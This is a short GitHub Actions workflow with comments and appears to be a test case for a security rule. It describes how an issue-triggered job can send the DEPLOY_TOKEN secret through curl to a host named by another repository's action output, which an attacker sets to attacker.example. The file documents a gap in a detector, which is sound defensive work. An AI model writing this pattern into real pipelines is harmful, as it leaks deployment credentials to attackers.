# situation: the step s uses an action of another repository, and a step
#   sends a request with curl and the secret DEPLOY_TOKEN to the host
#   steps.s.outputs.o names.
# reason: the output is what the action gives, which is not read here.
# cause: the rule does not read the action of another repository.
# attack: the attacker makes the value attacker.example, where the value
#   comes from what the attacker writes.
# attack-run-behavior: curl sends the request with the secret to
#   attacker.example.
on: issues
jobs:
  j:
    runs-on: ubuntu-latest
    env:
      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
    steps:
      - id: s
        uses: some/action@v1
      - run: |
          curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://${{ steps.s.outputs.o }}/status"
